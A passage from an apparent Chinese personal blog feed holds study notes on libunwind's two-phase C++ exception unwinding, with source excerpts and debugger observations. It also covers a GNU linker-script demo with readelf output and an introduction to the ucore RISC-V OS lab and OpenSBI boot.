_LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">          <span class="string">&quot;unwind_phase1(ex_ojb=%p): __unw_get_proc_info &quot;</span></span><br><span class="line">          <span class="string">&quot;failed =&gt; _URC_FATAL_PHASE1_ERROR&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)exception_object);</span><br><span class="line">      <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// When tracing, print state information.</span></span><br><span class="line">    <span class="keyword">if</span> (_LIBUNWIND_TRACING_UNWINDING) &#123;</span><br><span class="line">      <span class="type">char</span> functionBuf[<span class="number">512</span>];</span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *functionName = functionBuf;</span><br><span class="line">      <span class="type">unw_word_t</span> offset;</span><br><span class="line">      <span class="keyword">if</span> ((__unw_get_proc_name(cursor, functionBuf, <span class="keyword">sizeof</span>(functionBuf),</span><br><span class="line">                               &amp;offset) != UNW_ESUCCESS) ||</span><br><span class="line">          (frameInfo.start_ip + offset &gt; frameInfo.end_ip))</span><br><span class="line">        functionName = <span class="string">&quot;.anonymous.&quot;</span>;</span><br><span class="line">      <span class="type">unw_word_t</span> pc;</span><br><span class="line">      __unw_get_reg(cursor, UNW_REG_IP, &amp;pc);</span><br><span class="line">      _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">          <span class="string">&quot;unwind_phase1(ex_ojb=%p): pc=0x%&quot;</span> PRIxPTR <span class="string">&quot;, start_ip=0x%&quot;</span> PRIxPTR</span><br><span class="line">          <span class="string">&quot;, func=%s, lsda=0x%&quot;</span> PRIxPTR <span class="string">&quot;, personality=0x%&quot;</span> PRIxPTR <span class="string">&quot;&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)exception_object, pc, frameInfo.start_ip, functionName,</span><br><span class="line">          frameInfo.lsda, frameInfo.handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there is a personality routine, ask it if it will want to stop at</span></span><br><span class="line">    <span class="comment">// this frame.</span></span><br><span class="line">    <span class="keyword">if</span> (frameInfo.handler != <span class="number">0</span>) &#123;</span><br><span class="line">      __personality_routine p =</span><br><span class="line">          (__personality_routine)(<span class="type">uintptr_t</span>)(frameInfo.handler);</span><br><span class="line">      _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">          <span class="string">&quot;unwind_phase1(ex_ojb=%p): calling personality function %p&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)exception_object, (<span class="type">void</span> *)(<span class="type">uintptr_t</span>)p);</span><br><span class="line">      _Unwind_Reason_Code personalityResult =</span><br><span class="line">          (*p)(<span class="number">1</span>, _UA_SEARCH_PHASE, exception_object-&gt;exception_class,</span><br><span class="line">               exception_object, (<span class="keyword">struct</span> _Unwind_Context *)(cursor));</span><br><span class="line">      <span class="keyword">switch</span> (personalityResult) &#123;</span><br><span class="line">      <span class="keyword">case</span> _URC_HANDLER_FOUND:</span><br><span class="line">        <span class="comment">//	 found a catch clause or locals that need destructing in this frame</span></span><br><span class="line">        <span class="comment">// stop search and remember stack pointer at the frame</span></span><br><span class="line">        handlerNotFound = <span class="literal">false</span>;</span><br><span class="line">        __unw_get_reg(cursor, UNW_REG_SP, &amp;sp);</span><br><span class="line">        exception_object-&gt;private_2 = (<span class="type">uintptr_t</span>)sp;</span><br><span class="line">        _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">            <span class="string">&quot;unwind_phase1(ex_ojb=%p): _URC_HANDLER_FOUND&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)exception_object);</span><br><span class="line">        <span class="keyword">return</span> _URC_NO_REASON;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> _URC_CONTINUE_UNWIND:</span><br><span class="line">        _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">            <span class="string">&quot;unwind_phase1(ex_ojb=%p): _URC_CONTINUE_UNWIND&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)exception_object);</span><br><span class="line">        <span class="comment">// continue unwinding</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// something went wrong</span></span><br><span class="line">        _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">            <span class="string">&quot;unwind_phase1(ex_ojb=%p): _URC_FATAL_PHASE1_ERROR&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)exception_object);</span><br><span class="line">        <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _URC_NO_REASON;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>phase2</p>
<p>**初始化光标 (<code>cursor</code>)**：</p>
<ul>
<li>函数首先通过 <code>__unw_init_local(cursor, uc)</code> 初始化光标，以便在当前上下文中遍历堆栈帧。光标用于跟踪堆栈展开过程中的当前栈帧。</li>
</ul>
<p><strong>遍历栈帧</strong>：</p>
<ul>
<li>函数进入一个循环，调用 <code>__unw_step(cursor)</code> 来遍历堆栈帧。如果返回值为 0，表示已经到达堆栈的底部，函数返回 <code>_URC_END_OF_STACK</code>，表示堆栈展开已经完成。</li>
<li>如果 <code>__unw_step(cursor)</code> 返回负值，表示在移动到下一个栈帧时发生了错误，函数返回 <code>_URC_FATAL_PHASE2_ERROR</code>，表示在第二阶段遇到致命错误。</li>
</ul>
<p><strong>获取栈帧信息</strong>：</p>
<ul>
<li>对于每个栈帧，函数调用 <code>__unw_get_proc_info(cursor, &amp;frameInfo)</code> 来获取与该栈帧相关联的处理信息（如程序计数器、栈指针等）。如果获取信息失败，函数返回 <code>_URC_FATAL_PHASE2_ERROR</code>。</li>
</ul>
<p>**检查栈帧中的 <code>personality routine</code>**：</p>
<ul>
<li>如果当前栈帧有 <code>personality routine</code>（即 <code>frameInfo.handler</code> 不为 0），函数将调用它来决定如何处理该栈帧。</li>
<li>如果栈指针 <code>sp</code> 等于 <code>exception_object-&gt;private_2</code>，表示这个栈帧是在第一阶段中标记为需要处理的栈帧，函数会向 <code>personality routine</code> 传递 <code>_UA_HANDLER_FRAME</code> 标志，指示这是一个需要处理的帧。</li>
</ul>
<p><strong>处理 <code>personality routine</code> 的返回值</strong>：</p>
<ul>
<li><pre><code>personality routine
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   可能返回以下几种结果：</span><br><span class="line"></span><br><span class="line">  - **_URC_CONTINUE_UNWIND**：继续展开堆栈，函数将继续遍历下一个栈帧。</span><br><span class="line">  - **_URC_INSTALL_CONTEXT**：`personality routine` 指示需要转移控制权到异常处理器，函数调用 `__unw_resume(cursor)` 将控制权转移到处理器。如果 `__unw_resume` 返回，表示发生了错误，函数返回 `_URC_FATAL_PHASE2_ERROR`。</span><br><span class="line"></span><br><span class="line">**错误处理**：</span><br><span class="line"></span><br><span class="line">- 如果在遍历栈帧的过程中发生任何无法处理的错误，函数会记录错误信息并返回 `_URC_FATAL_PHASE2_ERROR`。</span><br><span class="line"></span><br><span class="line">```C</span><br><span class="line">static _Unwind_Reason_Code</span><br><span class="line">unwind_phase2(unw_context_t *uc, unw_cursor_t *cursor, _Unwind_Exception *exception_object) &#123;</span><br><span class="line"> __unw_init_local(cursor, uc);</span><br><span class="line"></span><br><span class="line"> _LIBUNWIND_TRACE_UNWINDING(&quot;unwind_phase2(ex_ojb=%p)&quot;,</span><br><span class="line">                            (void *)exception_object);</span><br><span class="line"></span><br><span class="line"> // Walk each frame until we reach where search phase said to stop.</span><br><span class="line"> while (true) &#123;</span><br><span class="line"></span><br><span class="line">   // Ask libunwind to get next frame (skip over first which is</span><br><span class="line">   // _Unwind_RaiseException).</span><br><span class="line">   int stepResult = __unw_step(cursor);</span><br><span class="line">   if (stepResult == 0) &#123;</span><br><span class="line">     _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">         &quot;unwind_phase2(ex_ojb=%p): __unw_step() reached &quot;</span><br><span class="line">         &quot;bottom =&gt; _URC_END_OF_STACK&quot;,</span><br><span class="line">         (void *)exception_object);</span><br><span class="line">     return _URC_END_OF_STACK;</span><br><span class="line">   &#125; else if (stepResult &lt; 0) &#123;</span><br><span class="line">     _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">         &quot;unwind_phase2(ex_ojb=%p): __unw_step failed =&gt; &quot;</span><br><span class="line">         &quot;_URC_FATAL_PHASE1_ERROR&quot;,</span><br><span class="line">         (void *)exception_object);</span><br><span class="line">     return _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // Get info about this frame.</span><br><span class="line">   unw_word_t sp;</span><br><span class="line">   unw_proc_info_t frameInfo;</span><br><span class="line">   __unw_get_reg(cursor, UNW_REG_SP, &amp;sp);</span><br><span class="line">   if (__unw_get_proc_info(cursor, &amp;frameInfo) != UNW_ESUCCESS) &#123;</span><br><span class="line">     _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">         &quot;unwind_phase2(ex_ojb=%p): __unw_get_proc_info &quot;</span><br><span class="line">         &quot;failed =&gt; _URC_FATAL_PHASE1_ERROR&quot;,</span><br><span class="line">         (void *)exception_object);</span><br><span class="line">     return _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // When tracing, print state information.</span><br><span class="line">   if (_LIBUNWIND_TRACING_UNWINDING) &#123;</span><br><span class="line">     char functionBuf[512];</span><br><span class="line">     const char *functionName = functionBuf;</span><br><span class="line">     unw_word_t offset;</span><br><span class="line">     if ((__unw_get_proc_name(cursor, functionBuf, sizeof(functionBuf),</span><br><span class="line">                              &amp;offset) != UNW_ESUCCESS) ||</span><br><span class="line">         (frameInfo.start_ip + offset &gt; frameInfo.end_ip))</span><br><span class="line">       functionName = &quot;.anonymous.&quot;;</span><br><span class="line">     _LIBUNWIND_TRACE_UNWINDING(&quot;unwind_phase2(ex_ojb=%p): start_ip=0x%&quot; PRIxPTR</span><br><span class="line">                                &quot;, func=%s, sp=0x%&quot; PRIxPTR &quot;, lsda=0x%&quot; PRIxPTR</span><br><span class="line">                                &quot;, personality=0x%&quot; PRIxPTR,</span><br><span class="line">                                (void *)exception_object, frameInfo.start_ip,</span><br><span class="line">                                functionName, sp, frameInfo.lsda,</span><br><span class="line">                                frameInfo.handler);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // If there is a personality routine, tell it we are unwinding.</span><br><span class="line">   if (frameInfo.handler != 0) &#123;</span><br><span class="line">     __personality_routine p =</span><br><span class="line">         (__personality_routine)(uintptr_t)(frameInfo.handler);</span><br><span class="line">     _Unwind_Action action = _UA_CLEANUP_PHASE;</span><br><span class="line">     if (sp == exception_object-&gt;private_2) &#123;</span><br><span class="line">       // Tell personality this was the frame it marked in phase 1.</span><br><span class="line">       action = (_Unwind_Action)(_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME);</span><br><span class="line">     &#125;</span><br><span class="line">      _Unwind_Reason_Code personalityResult =</span><br><span class="line">         (*p)(1, action, exception_object-&gt;exception_class, exception_object,</span><br><span class="line">              (struct _Unwind_Context *)(cursor));</span><br><span class="line">     switch (personalityResult) &#123;</span><br><span class="line">     case _URC_CONTINUE_UNWIND:</span><br><span class="line">       // Continue unwinding</span><br><span class="line">       _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">           &quot;unwind_phase2(ex_ojb=%p): _URC_CONTINUE_UNWIND&quot;,</span><br><span class="line">           (void *)exception_object);</span><br><span class="line">       if (sp == exception_object-&gt;private_2) &#123;</span><br><span class="line">         // Phase 1 said we would stop at this frame, but we did not...</span><br><span class="line">         _LIBUNWIND_ABORT(&quot;during phase1 personality function said it would &quot;</span><br><span class="line">                          &quot;stop here, but now in phase2 it did not stop here&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">       break;</span><br><span class="line">     case _URC_INSTALL_CONTEXT:</span><br><span class="line">       _LIBUNWIND_TRACE_UNWINDING(</span><br><span class="line">           &quot;unwind_phase2(ex_ojb=%p): _URC_INSTALL_CONTEXT&quot;,</span><br><span class="line">           (void *)exception_object);</span><br><span class="line">       // Personality routine says to transfer control to landing pad.</span><br><span class="line">       // We may get control back if landing pad calls _Unwind_Resume().</span><br><span class="line">       if (_LIBUNWIND_TRACING_UNWINDING) &#123;</span><br><span class="line">         unw_word_t pc;</span><br><span class="line">         __unw_get_reg(cursor, UNW_REG_IP, &amp;pc);</span><br><span class="line">         __unw_get_reg(cursor, UNW_REG_SP, &amp;sp);</span><br><span class="line">         _LIBUNWIND_TRACE_UNWINDING(&quot;unwind_phase2(ex_ojb=%p): re-entering &quot;</span><br><span class="line">                                    &quot;user code with ip=0x%&quot; PRIxPTR</span><br><span class="line">                                    &quot;, sp=0x%&quot; PRIxPTR,</span><br><span class="line">                                    (void *)exception_object, pc, sp);</span><br><span class="line">       &#125;</span><br><span class="line">       __unw_resume(cursor);</span><br><span class="line">       // __unw_resume() only returns if there was an error.</span><br><span class="line">       return _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">     default:</span><br><span class="line">       // Personality routine returned an unknown result code.</span><br><span class="line">       _LIBUNWIND_DEBUG_LOG(&quot;personality function returned unknown result %d&quot;,</span><br><span class="line">                            personalityResult);</span><br><span class="line">       return _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> // Clean up phase did not resume at the frame that the search phase</span><br><span class="line"> // said it would...</span><br><span class="line"> return _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</blockquote>
<h5 id="4-异常处理"><a href="#4-异常处理" class="headerlink" title="4.异常处理"></a>4.异常处理</h5><blockquote>
<ul>
<li>对于被search phase标记的栈帧，landing pad调用<code>__cxa_begin_catch</code>，然后执行catch block中的代码，最后调用<code>__cxa_end_catch</code>销毁exception object</li>
</ul>
</blockquote>
<h3 id="3-关于文件结构"><a href="#3-关于文件结构" class="headerlink" title="3.关于文件结构"></a>3.关于文件结构</h3><blockquote>
<p>此部分描述了如何识别personality routine</p>
</blockquote>
<h2 id="四-调试"><a href="#四-调试" class="headerlink" title="四 调试"></a>四 调试</h2><blockquote>
<p>以2024羊城杯为例子</p>
</blockquote>
<h3 id="异常对象的空间分配与抛出"><a href="#异常对象的空间分配与抛出" class="headerlink" title="异常对象的空间分配与抛出"></a>异常对象的空间分配与抛出</h3><blockquote>
<p>初始全0</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> __cxa_allocate_exception@plt;</span><br><span class="line"><span class="number">0x586110</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">........................</span><br><span class="line"><span class="number">0x586190</span>:       <span class="number">0x00000000905f2923</span>      <span class="number">0x0000000000000f21</span></span><br><span class="line">__cxa_throw@plt;</span><br><span class="line">	调用： __cxa_get_globals@plt获得exception <span class="built_in">stack</span>存储在：<span class="number">0x7f9ec5b5f3a0</span></span><br><span class="line">	调用： __cxa_init_primary_exception@plt 来初始化__cxa_exception，结果如图：可以看出都被初始化。</span><br></pre></td></tr></table></figure>

<p><img src="/../../../themes/butterfly/source/img/mypic/%E5%BC%82%E5%B8%B8/1.png" alt="image-20240903211022609"></p>
<h3 id="搜查阶段"><a href="#搜查阶段" class="headerlink" title="搜查阶段"></a>搜查阶段</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">调用：_Unwind_RaiseException@plt</span><br><span class="line">之后查找存在personality，则调用，可观察到此函数的第五个参数为一个链条这个也许就是</span><br><span class="line">    (<span class="keyword">struct</span> _Unwind_Context *)(cursor)</span><br></pre></td></tr></table></figure>

<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240903212603434.png" alt="image-20240903212603434"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240903212615565.png" alt="image-20240903212615565"></p>
<blockquote>
<p>调用三次之后，终于在调用__gxx_personality_v0时找到处理函数，private被赋值，为：0x7ffffc2572d0</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240903213114934.png" alt="image-20240903213114934"></p>
]]></content>
  </entry>
  <entry>
    <title>链接控制脚本</title>
    <url>/2024/08/16/%E9%93%BE%E6%8E%A5%E6%8E%A7%E5%88%B6%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>链接器作为一个程序可以精细的控制其的连接过程，学习过段的合并过程，在学习一下如何控制，以写一个比较小的玩具程序作为学习主线。</p>
<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h2><blockquote>
<p>本次实验用的write</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@L:/usr/include/x86_64-linux-gnu/asm# <span class="built_in">cat</span> unistd_64.h</span><br><span class="line"><span class="comment">#ifndef _ASM_UNISTD_64_H</span></span><br><span class="line"><span class="comment">#define _ASM_UNISTD_64_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define __NR_read 0</span></span><br><span class="line"><span class="comment">#define __NR_write 1</span></span><br><span class="line"><span class="comment">#define __NR_open 2</span></span><br><span class="line"><span class="comment">#define __NR_close 3</span></span><br></pre></td></tr></table></figure>

<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><blockquote>
<p>因为程序结束后会ret到非法地址，我也不想去给他写exit了，知道怎么会是就行了</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* str = <span class="string">&quot;Hello world!\n\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;movq $13,%rdx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movq $1,%rdi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movq (str),%rsi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movq $1,%rax\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall\n\t&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        print();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++<span class="meta"># gcc  -nostdlib -fno-exceptions -fno-unwind-tables -fno-stack-protector -fno-common -c minihello.c -o min.o</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># ld -static -e main -o min min.o</span></span><br><span class="line">root@L:/home/l/c++# ./min</span><br><span class="line">Hello world!</span><br><span class="line">Segmentation fault</span><br><span class="line">root@L:/home/l/c++# ./minds</span><br><span class="line">Hello world!</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<h2 id="链接脚本"><a href="#链接脚本" class="headerlink" title="链接脚本"></a>链接脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTRY(main)</span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">    mintext : &#123;*(.text) *(.data) *(.rodata)&#125;</span><br><span class="line">    /DISCARD/ : &#123;*(.comment) *(.strtab)&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="差异对比"><a href="#差异对比" class="headerlink" title="差异对比"></a>差异对比</h2><blockquote>
<p>可以看出合并之后少了好几个段</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++# readelf -S minds</span><br><span class="line">There are 8 section headers, starting at offset 0x11b8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .note.gnu.pr[...] NOTE             0000000000000000  00001000</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [ 2] .eh_frame         PROGBITS         0000000000000020  00001020</span><br><span class="line">       0000000000000058  0000000000000000   A       0     0     8</span><br><span class="line">  [ 3] mintext           PROGBITS         0000000000000078  00001078</span><br><span class="line">       000000000000004e  0000000000000000 WAX       0     0     1</span><br><span class="line">  [ 4] .data.rel.local   PROGBITS         00000000000000c8  000010c8</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [ 5] .symtab           SYMTAB           0000000000000000  000010d0</span><br><span class="line">       0000000000000078  0000000000000018           6     2     8</span><br><span class="line">  [ 6] .strtab           STRTAB           0000000000000000  00001148</span><br><span class="line">       000000000000001c  0000000000000000           0     0     1</span><br><span class="line">  [ 7] .shstrtab         STRTAB           0000000000000000  00001164</span><br><span class="line">       0000000000000050  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br><span class="line">root@L:/home/l/c++# readelf -S min.o</span><br><span class="line">There are 16 section headers, starting at offset 0x310:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .text             PROGBITS         0000000000000000  00000040</span><br><span class="line">       000000000000003f  0000000000000000  AX       0     0     1</span><br><span class="line">  [ 2] .rela.text        RELA             0000000000000000  00000208</span><br><span class="line">       0000000000000030  0000000000000018   I      13     1     8</span><br><span class="line">  [ 3] .data             PROGBITS         0000000000000000  0000007f</span><br><span class="line">       0000000000000000  0000000000000000  WA       0     0     1</span><br><span class="line">  [ 4] .bss              NOBITS           0000000000000000  0000007f</span><br><span class="line">       0000000000000000  0000000000000000  WA       0     0     1</span><br><span class="line">  [ 5] .rodata           PROGBITS         0000000000000000  0000007f</span><br><span class="line">       000000000000000f  0000000000000000   A       0     0     1</span><br><span class="line">  [ 6] .data.rel.local   PROGBITS         0000000000000000  00000090</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [ 7] .rela.data.r[...] RELA             0000000000000000  00000238</span><br><span class="line">       0000000000000018  0000000000000018   I      13     6     8</span><br><span class="line">  [ 8] .comment          PROGBITS         0000000000000000  00000098</span><br><span class="line">       000000000000002c  0000000000000001  MS       0     0     1</span><br><span class="line">  [ 9] .note.GNU-stack   PROGBITS         0000000000000000  000000c4</span><br><span class="line">       0000000000000000  0000000000000000           0     0     1</span><br><span class="line">  [10] .note.gnu.pr[...] NOTE             0000000000000000  000000c8</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [11] .eh_frame         PROGBITS         0000000000000000  000000e8</span><br><span class="line">       0000000000000058  0000000000000000   A       0     0     8</span><br><span class="line">  [12] .rela.eh_frame    RELA             0000000000000000  00000250</span><br><span class="line">       0000000000000030  0000000000000018   I      13    11     8</span><br><span class="line">  [13] .symtab           SYMTAB           0000000000000000  00000140</span><br><span class="line">       00000000000000a8  0000000000000018          14     4     8</span><br><span class="line">  [14] .strtab           STRTAB           0000000000000000  000001e8</span><br><span class="line">       000000000000001c  0000000000000000           0     0     1</span><br><span class="line">  [15] .shstrtab         STRTAB           0000000000000000  00000280</span><br><span class="line">       0000000000000089  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>cs</category>
        <category>读书笔记</category>
        <category>ELF</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>linker</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title>ucore实验1</title>
    <url>/2024/08/31/qemu%E5%AE%9E%E9%AA%8C/lab1/</url>
    <content><![CDATA[<blockquote>
<p>本篇文章开始记录一些ucore的学习例程，以nku的2024实验作业为例</p>
<p>myblog：<a href="https://moyingxing.github.io/">https://moyingxing.github.io/</a></p>
</blockquote>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.mobisys.cc/oslab/lab2023/_book/lab0.5/lab0.5_3_1_layout.html">OpenSBI,bin,ELF · GitBook (mobisys.cc)</a></p>
<p><a href="https://riscv.org/wp-content/uploads/2017/05/riscv-privileged-v1.10.pdf">https://riscv.org/wp-content/uploads/2017/05/riscv-privileged-v1.10.pdf</a></p>
<p><a href="https://tinylab.org/riscv-uefi-part1/">https://tinylab.org/riscv-uefi-part1/</a></p>
<p><a href="http://www.mobisys.cc/oslab/lab2023/_book/lab0.5/lab0.5_3_1_layout.html">OpenSBI,bin,ELF · GitBook (mobisys.cc)</a></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>os：wsl ubuntu22.04</p>
<p>gcc（交叉编译器手动编译）：13.2.0</p>
<p>qemu：QEMU emulator version 6.2.0 (Debian 1:6.2+dfsg-2ubuntu6.22)</p>
<p>代码资源：<a href="http://www.mobisys.cc/oslab/index.html">OS Labs (mobisys.cc)</a></p>
<h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><blockquote>
<p>因为本实验是以riscv-64位基础架构开发的os，因此需要理解此架构提供的一些硬件资源（如寄存器等等）和一些资源管理模式（第一感觉类似于x86架构下的GDT,LDT,IDT之类），因为是os级别的开发，所以只涉及到特权架构。</p>
</blockquote>
<h3 id="RISC-V-特权软件栈"><a href="#RISC-V-特权软件栈" class="headerlink" title="RISC-V 特权软件栈"></a>RISC-V 特权软件栈</h3><blockquote>
<p>描述在 RISC-V 处理器上运行的特权模式下的软件架构、模式和组件。十分的接口化和模块化，这块感觉和amd64相比是比较规范的，amd64基本上没有这么的考虑接口这些个东西。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/os/riscv.png" alt="image-20240831162403318"></p>
<p>本图从总体上描述了riscv上运行的软件的运行模式，任意两层之间的交互全都是通过二进制接口进行的，如中间的图像，os的实现可以调用下一层提供的Supervisor二进制接口来进行实现（这大概能保证os的移植性吧不知道，没体会到过），而SEE则是二进制接口的执行环境，对于os来说这大概就是在装载os之前实现的吧。最后一幅图主要讲的是虚拟机的实现方式，不是本次实验的重点，主要理解中间这副图即可。</p>
<h3 id="特权等级"><a href="#特权等级" class="headerlink" title="特权等级"></a>特权等级</h3><blockquote>
<p>接触过内核的都知道，指令是有权限的，比如一个用户级别的指令可以影响os级别的mmu的映射方式，那么一些恶意软件只要控制了一个用户级别的程序则可以控制你的电脑，都没有LPE什么事了，这岂不是乱套了？</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/os/%E6%9D%83%E9%99%90.png" alt="image-20240831163159340"></p>
<p>可以看出riscv的架构分别有三种安全模式，分别为U,S,M，安全模式相关的信息存储在CSR寄存器中，因此当cpu进行指令执行时，会先检查CSR寄存器来判断是否有权限来执行此指令。越权访问将导致异常，会陷入异常处理程序。若使用riscv架构，那么硬件方面必须实现M特权，而其他特权是可选的。不同的特权有着不同的指令集扩展，需要深入学习。</p>
<h2 id="关于qemu在装载os前做的准备"><a href="#关于qemu在装载os前做的准备" class="headerlink" title="关于qemu在装载os前做的准备"></a>关于qemu在装载os前做的准备</h2><blockquote>
<p>riscv架构下，os的装载基址在物理地址0x80000000（此时未启动mmu），在执行os代码前，会先进行一些硬件环境初始化工作，从上面的介绍可以看出来，下面将一一介绍和学习。</p>
</blockquote>
<p>BIOS，UEFI和U-BOOT此三类程序才是一个计算机启动时首先运行的，但是BIOS经过一些列的标准化等等发展成了UEFI，而U-BOOT主要是用于嵌入式系统，经过一些列的初始化装载操作会执行一个叫做bootloader的东西，这个是os的装载的核心部分。可以看出bootloader在运行之前也是做了一些准备的，具体是啥不用关系，对学os没什么阻碍。至于实验文档上说的<code>QEMU模拟的这款riscv处理器的复位地址是0x1000，而不是0x80000000</code>估计也是这个原因吧。而在riscv架构下的bootloader则是OpenSBI。</p>
<p>关于opensbi的源代码可以通过下述命令来获取<code>git clone https://gitee.com/tinylab/qemu-opensbi.git</code>，在其中找到firmware文件夹，可以通过连接控制脚本来找到程序的入口点为__start,代码比较长就复制一下前几部分：</p>
